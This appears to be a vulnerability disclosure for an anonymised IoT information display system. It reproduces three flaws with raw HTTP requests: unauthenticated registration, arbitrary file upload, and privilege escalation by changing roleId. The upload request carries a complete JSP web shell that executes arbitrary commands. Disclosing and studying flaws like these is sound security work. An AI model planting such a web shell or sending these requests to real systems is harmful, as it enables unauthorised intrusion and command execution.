# XX-IoT-System
某XXIoT信息展示系统
<h1 id="PnHti">_<u>Vulnerability Overview: </u>_</h1>
| vulnerability Name  |
| --- |
| 1. Any user registration  |
| 2. Any file Upload  |
| 3. User Authority Promotion  |


---

<h1 id="d5VYs">_any User Registration _</h1>
cause of vulnerability: 

<font style="background-color:#F1A2AB;">improper access control to registration page, insufficient user input validation </font>

---

<font style="background-color:rgba(255, 255, 255, 0);">reproduction steps: </font>

1. Improper access control verification, direct access to the page 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743497865342-6d6af472-46c5-4d5f-ad60-7cab5e3c54c8.png)

2, the registration is successful 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743497699910-cead3c83-594a-47c6-994a-af38a65ed50d.png)

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743502804077-d497301a-7b4c-4c8e-8b26-34234003da91.png)

```plain
POST /xx/xxxx/xxxxxxxxAccount.html HTTP/1.1
Host: 192.168.196.142:xxxx
Content-Length: 139
Cache-Control: max-age=0
Origin: http://192.168.196.142:xxxx
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Connection: keep-alive

userName=kkl1233&userPassword=wuhuKKL%40123&userRePassword=wuhuKKL%40123&userPhone=19666666666&province=110000&city=110100&county=110101&submit=
```



---

<h1 id="d59sP">_upload any file _</h1>
cause of vulnerability: 

<font style="background-color:#F1A2AB;">insufficient file type validation </font><font style="background-color:rgba(255, 255, 255, 0);"></font>

---

reproduction steps: 

1, access the file upload point, use `Burp suite `grab the package and modify the file suffix and content. 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743500712015-35ebd1ab-ff90-439e-8208-90d5d249bb51.png)

By `"savePath" `can control the upload path 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743500421065-2ec6aab7-bd6c-486c-b44c-5d44a6d13665.png)

2. Access the malicious file address and execute arbitrary commands after the upload is successful 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743500927793-3340337f-ed54-44df-9923-856d626dcf24.png)

```plain
POST /xxxxxxx/upload/userfile.htm HTTP/1.1
Host: 192.168.196.142:xxxx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1Ny332LTTu9INsqE

------WebKitFormBoundary1Ny332LTTu9INsqE
Content-Disposition: form-data; name="savePath"

/resource
------WebKitFormBoundary1Ny332LTTu9INsqE
Content-Disposition: form-data; name="userId"

7
------WebKitFormBoundary1Ny332LTTu9INsqE
Content-Disposition: form-data; name="filedata"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@ page language="java" import="java.io.*" %>
<%
String cmd = request.getParameter("c");
if (cmd != null) {
    out.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next());
}
%>
------WebKitFormBoundary1Ny332LTTu9INsqE--
```

---

<h1 id="Jqvov">user privilege elevation </h1>
cause of vulnerability: 

the system's "* User rights verification *" uses only the roleid parameter to distinguish users with different rights (such as ordinary users and administrators). 

Reproduction steps:

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743505276942-36e05d5d-c5a7-4168-9045-c825503cdcc4.png)

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743505114427-20b72bbb-b990-4425-b588-c4a4d0354662.png)

1. Obtain self userId = 7 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743505159287-2c0a1fdb-0867-42bd-a180-327b899df3f0.png)

2. Directly send a request to modify roleId 

you need to modify your own cookies. 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743505444455-532c5230-2be1-4ee0-844f-9759db6d7d52.png)

View and modify successfully 

admin User View kkl123 

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743505476426-b38a010c-0f9a-4843-bafc-3561f51af5f8.png)

kkl123 User Login

![](https://cdn.nlark.com/yuque/0/2025/png/28521795/1743505642442-a4553a49-d242-42cb-bd38-ca57691936ac.png)

```plain
POST /xx/xxxxxxxx/xxxx/allocation.html HTTP/1.1
Host: 192.168.196.142:xxxx
Content-Length: 17
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.196.142:xxxx
Cookie: JSESSIONID=cookie; DOMAIN_NAME=
Connection: keep-alive

userId=7&roleId=x
```

---

